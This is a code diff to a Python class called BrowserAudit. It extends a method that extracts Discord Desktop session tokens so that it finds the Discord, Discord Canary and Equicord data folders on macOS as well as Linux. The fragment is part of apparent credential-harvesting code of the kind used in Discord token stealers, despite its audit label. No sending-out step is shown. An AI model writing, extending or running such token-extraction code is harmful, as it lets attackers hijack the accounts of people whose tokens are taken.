@@ -165,14 +165,21 @@ class BrowserAudit:
             import plyvel
         except ImportError:
             return
-        
+
         print("[*] Extracting Discord Desktop tokens...")
-        
-        discord_dirs = {
-            "Discord": self.home / ".config/discord",
-            "Discord Canary": self.home / ".config/discordcanary",
-            "Equicord": self.home / ".config/Equicord"
-        }
+
+        if self.os_type == 'darwin':
+            discord_dirs = {
+                "Discord": self.home / "Library/Application Support/discord",
+                "Discord Canary": self.home / "Library/Application Support/discordcanary",
+                "Equicord": self.home / "Library/Application Support/Equicord"
+            }
+        else:
+            discord_dirs = {
+                "Discord": self.home / ".config/discord",
+                "Discord Canary": self.home / ".config/discordcanary",
+                "Equicord": self.home / ".config/Equicord"
+            }
         
         found_any = False
         
